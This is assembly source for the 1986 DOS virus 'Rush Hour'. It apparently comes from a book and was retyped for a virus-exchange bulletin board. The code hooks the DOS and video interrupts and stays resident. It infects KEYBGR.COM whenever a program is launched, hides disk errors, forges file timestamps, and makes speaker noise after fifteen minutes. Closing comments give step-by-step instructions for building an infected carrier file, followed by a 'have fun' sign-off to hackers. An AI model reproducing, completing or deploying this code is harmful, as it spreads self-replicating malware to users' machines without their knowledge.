PAGE   72,132
          TITLE        Virus "RUSH HOUR"             (p) Foxi, 1986

          NAME        VIRUS

ABS0         SEGMENT         AT 0
             ORG             4*10H
VIDEO_INT    DW              2 DUP (?)          ; VIDEO INTERRUPT
                                                ; VECTOR
             ORG             4*21H
DOS_INT      DW              2 DUP (?)          ; DOS          -"-
             ORG             4*24H
ERROR_INT    DW              2 DUP (?)          ; ERROR        -"-
ABS0         ENDS


CODE      SEGMENT
          ASSUME      CS:CODE, DS:CODE, ES:CODE

             ORG      05CH
FCB          LABEL    BYTE
DRIVE        DB       ?
FSPEC        DB       11 DUP (' ')              ; Filename
             ORG      6CH
FSIZE        DW       2 DUP (?)
FDATE        DW       ?                         ; date of last
                                                ; modification
FTIME        DW       ?                         ; time  -"-     -"-
             ORG      80H
DTA          DW       128 DUP (?)               ; Disk Transfer Area

             ORG      071EH                     ; end of the normal
                                                ; KEYBGR.COM

             XOR      AX,AX
             MOV      ES,AX                     ; ES points to ABS0
             ASSUME   ES:ABS0

             PUSH     CS
             POP      DS

             MOV      AX,VIDEO_INT              ; store old
                                                ; interrupt vectors
             MOV      BX,VIDEO_INT+2
             MOV      word ptr VIDEO_VECTOR,AX
             MOV      word ptr VIDEO_VECTOR+2,BX
             MOV      AX,DOS_INT
             MOV      BX,DOS_INT+2
             MOV      word ptr DOS_VECTOR,AX
             MOV      word ptr DOS_VECTOR+2,BX
             CLI
             MOV      DOS_INT,OFFSET VIRUS      ; new DOS vector
                                                ; points to
                                                ; VIRUS
             MOV      DOS_INT+2,CS
             MOV      VIDEO_INT,OFFSET DISEASE  ; video vector
                                                ; points to DISEASE
             MOV      VIDEO_INT+2,CS
             STI

             MOV      AH,0
             INT      1AH                       ; read TimeOfDay (TOD)
             MOV      TIME_0,DX

             LEA      DX,VIRUS_ENDE
             INT      27H                       ; terminate program
                                                ; remain resident.

VIDEO_VECTOR          Dd           (?)
DOS_VECTOR            Dd           (?)
ERROR_VECTOR          DW           2 DUP (?)

TIME_0                DW           ?

;
; VIRUS main program:
;
; 1. System call  AH=4BH ?
;    No   : --> 2.
;    Yes  : Test KEYBGR.COM on specified drive
;           Already infected?
;           Yes  : --> 3.
;           No   : INFECTION !
;
; 2. Jump to normal DOS
;

RNDVAL       DB          'bfhg'
ACTIVE       DB          0                      ; not active

PRESET       DB          0                      ; first virus not
                                                ; active!
             DB          'A:'
FNAME        DB          'KEYBGR   COM'
             DB          0


VIRUS        PROC        FAR
             ASSUME      CS:CODE, DS:NOTHING, ES:NOTHING

             PUSH        AX
             PUSH        CX
             PUSH        DX

             MOV         AH,0                   ; check if at least 15
                                                ; min.
             INT         1AH                    ; have elapsed
                                                ; since
             SUB         DX,TIME_0              ; installation.
             CMP         DX,16384               ; (16384 ticks of the
                                                ; clock=15 min.)
             JL          $3
             MOV         ACTIVE,1               ; if so, activate
                                                ; virus.

$3:          POP         DX
             POP         CX
             POP         AX
                                                ; disk access
                                                ; because of the
             CMP         AX,4B00H               ; DOS command
             JE          $1                     ; "Load and execute
                                                ; program" ?
EXIT_1:
             JMP         DOS_VECTOR        ; No : --> continue as normal

$1:          PUSH        ES                     ; ES:BX    -->
                                                ;        parameter block
             PUSH        BX                     ; DS:DX    -->  filename
             PUSH        DS                     ; save registers which
                                                ; will be needed
             PUSH        DX                     ; for INT 21H
                                                ; (AH=4BH)
             MOV         DI,DX
             MOV         DRIVE,0                ; Set the drive
                                                ; of the
             MOV         AL,DS:[DI+1]           ; program to be
                                                ; executed
             CMP         AL,':'
             JNE         $5
             MOV         AL,DS:[DI]
             SUB         AL,'A'-1
             MOV         DRIVE,AL

$5:          CLD
             PUSH        CS
             POP         DS
             XOR         AX,AX
             MOV         ES,AX
             ASSUME      DS:CODE, ES:ABS0

             MOV         AX,ERROR_INT           ; Ignore all
                                                ; disk "errors"
             MOV         BX,ERROR_INT+2         ; with our own
                                                ; error routine
             MOV         ERROR_VECTOR,AX
             MOV         ERROR_VECTOR+2,BX
             MOV         ERROR_INT,OFFSET ERROR
             MOV         ERROR_INT+2,CS

             PUSH        CS
             POP         ES
             ASSUME      ES:CODE

             LEA         DX,DTA                 ; Disk Transfer Area
                                                ; select
             MOV         AH,1AH
             INT         21H

             MOV         BX,11                  ; transfer the
                                                ; filename
$2:
             MOV         AL,FNAME-1[BX]         ; into FileControlBlock
             MOV         FSPEC-1[BX],AL
             DEC         BX
             JNZ         $2

             LEA         DX,FCB                 ; open file ( for
                                                ; writing )
             MOV         AH,0FH
             INT         21H
             CMP         AL,0
             JNE         EXIT_0                 ; file does not exist -
                                                ; -> end
             MOV         byte ptr fcb+20h,0     ;
             MOV         AX,FTIME               ; file already infected ?
             CMP         AX,4800H
             JE          EXIT_0                 ; YES --> END

             MOV         PRESET,1               ; (All copies are
                                                ; virulent !)
             MOV         SI,100H                ; write the VIRUS in
                                                ; the file
$4:
             LEA         DI,DTA
             MOV         CX,128
             REP         MOVSB
             LEA         DX,FCB
             MOV         AH,15H
             INT         21H
             CMP         SI,OFFSET VIRUS_ENDE
             JL          $4

             MOV         FSIZE,OFFSET VIRUS_ENDE - 100H
             MOV         FSIZE+2,0              ; set correct
                                                ; file size
             MOV         FDATE,0AA3H            ; set correct date
                                                ; (03-05-86)
             MOV         FTIME,4800H            ;    -"-      time
                                                ; (09:00:00)

             LEA         DX,FCB                 ; close file
             MOV         AH,10H
             INT         21H

             XOR         AX,AX
             MOV         ES,AX
             ASSUME      ES:ABS0

             MOV         AX,ERROR_VECTOR        ; reset the error
                                                ; interrupt
             MOV         BX,ERROR_VECTOR+2
             MOV         ERROR_INT,AX
             MOV         ERROR_INT+2,BX

EXIT_0:
             POP         DX                     ; restore the saved
                                                ; registers
             POP         DS
             POP         BX
             POP         ES
             ASSUME      DS:NOTHING, ES:NOTHING

             MOV         AX,4B00H
             JMP         DOS_VECTOR             ; normal function execution

VIRUS        ENDP

ERROR        PROC        FAR
             IRET                               ; simply ignore all
                                                ; errors...
ERROR        ENDP

DISEASE      PROC        FAR
             ASSUME      DS:NOTHING, ES:NOTHING

             PUSH        AX                     ; These registers will be
                                                ; destroyed!

             TEST        PRESET,1
             JZ          EXIT_2
             TEST        ACTIVE,1
             JZ          EXIT_2

             IN          AL,61H                 ; Enable speaker
             AND         AL,0FEH                ; ( Bit 0 := 0 )
             OUT         61H,AL

             MOV         CX,3                   ; index loop CX

NOISE:
             MOV         AL,RNDVAL              ;     :
             XOR         AL,RNDVAL+3            ;     :
             SHL         AL,1                   ; generate NOISE
             SHL         AL,1                   ;     :
             RCL         WORD PTR RNDVAL,1      ;     :
             RCL         WORD PTR RNDVAL+2,1    ;     :

             MOV         AH,RNDVAL              ; output some bit
             AND         AH,2                   ; of the feedback
             IN          AL,61H                 ; shift register
             AND         AL,0FDH                ; --> noise from speaker
             OR          AL,AH
             OUT         61H,AL

EXIT_2:
             POP         CX
             POP         AX
             JMP         VIDEO_VECTOR           ; jump to the normal
                                                ; VIDEO routine.....
DISEASE      ENDP

             DB 'This program is a VIRUS program.'
             DB 'Once activated it has control over all'
             DB 'system devices and even over all storage'
             DB 'media inserted by the user. It continually'
             DB 'copies itself into uninfected operating'
             DB 'systems and thus spreads uncontrolled.'


             DB 'The fact that the virus does not destroy any'
             DB 'user programs or erase the disk is merely due'
             DB 'to a philanthropic trait of the author......'

             ORG         1C2AH

VIRUS_ENDE   LABEL       BYTE

CODE         ENDS

             END

; To get an executable program:
;
; 1.) Assemble and link source
; 2.) Rename EXE file to COM!
; 3.) Load renamed EXE file into DEBUG
; 4.) Reduce register CX to 300H
; 5.) Write COM file to disk with "w"
; 6.) Load COM file virus in DEBUG
; 7.) Load KEYBGR.COM
; 8.) Change addresses 71Eh ff. as follows:
;     71EH: 33 C0 8E C0 0E 1F 26
; 9.) Write KEYBGR.COM to disk with a length of 1B2A bytes
;
; Source code RUSHHOUR.ASM -- (C) 1986, foxi
;
; Taken from book "Computer Viruses - a high-tech disease"
;
; Source retyped by -=> CyberZone <=- Jon A Johnson
; U/l to Virus Exchange BBS - Sofia, Bulgaria
;
; "Have fun all you Hackers. hahaha" -->JAJ<--
